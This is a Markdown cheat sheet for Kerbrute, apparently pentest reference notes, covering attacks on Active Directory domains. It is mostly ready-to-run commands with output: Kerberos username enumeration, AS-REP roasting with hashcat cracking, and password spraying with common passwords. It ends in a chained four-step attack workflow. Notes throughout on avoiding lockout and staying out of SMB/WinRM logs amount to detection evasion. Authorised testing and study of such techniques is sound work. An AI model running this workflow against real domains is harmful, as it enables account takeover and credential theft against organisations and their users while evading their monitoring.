# Kerbrute: Kerberos User Enumeration & AS-REP Roasting

!!! tip "Tip"
    `kerbrute userenum --dc $DC_IP -d $DOMAIN userlist.txt` validates usernames without lockout (Kerberos pre-auth errors don't trigger lockout by default). Start with `jsmith`, `john.smith`, `jsmith@domain` format variations. AD environments vary in UPN format.

---

## Syntax

```bash
./kerbrute [command] [flags]
```

---

## Common Commands & Usage

### 1. Enumerate Valid Usernames

```bash
kerbrute userenum --dc $DC_IP -d $DOMAIN users.txt
```

Expected output:

```
[+] VALID USERNAME: jdoe@$DOMAIN
[-] INVALID USERNAME: hruser@$DOMAIN
```

Brute-force usernames with a large wordlist:

```bash
kerbrute userenum -d $DOMAIN --dc $DC_IP /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100
```

---

### 2. Find AS-REP Roastable Users

```bash
kerbrute asreproast --dc $DC_IP -d $DOMAIN users.txt
```

Output:

```bash
[+] FOUND AS-REP Roastable User: svc_backup@$DOMAIN
$krb5asrep$23$svc_backup@$DOMAIN:...hash...
```

Crack with:

```bash
hashcat -m 18200 hashes.txt rockyou.txt
```

---

### 3. Kerberos Password Spraying

```bash
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt --password "Summer2023!"
```

Output:

```plaintext
[+] VALID LOGIN: jdoe@$DOMAIN:Summer2023!
```

> Good for stealthy single-password attempts across many users.

---

## Operational Notes

- Works only if UDP/88 or TCP/88 is reachable
- Does not require domain join or admin rights
- Avoids logging on SMB/WinRM: quieter than `nxc smb` sprays
- Combine with `ldapsearch` or BloodHound output to build user wordlists

---

## Best Practice Workflow

```bash
# Step 1: Enumerate users
kerbrute userenum -d $DOMAIN --dc $DC_IP users.txt > valid.txt

# Step 2: Identify AS-REP roastable users
kerbrute asreproast -d $DOMAIN --dc $DC_IP valid.txt > roast.txt

# Step 3: Crack hashes offline
hashcat -m 18200 roast.txt rockyou.txt

# Step 4: Try password spraying if needed
kerbrute passwordspray -d $DOMAIN --dc $DC_IP valid.txt --password "Welcome1"
```
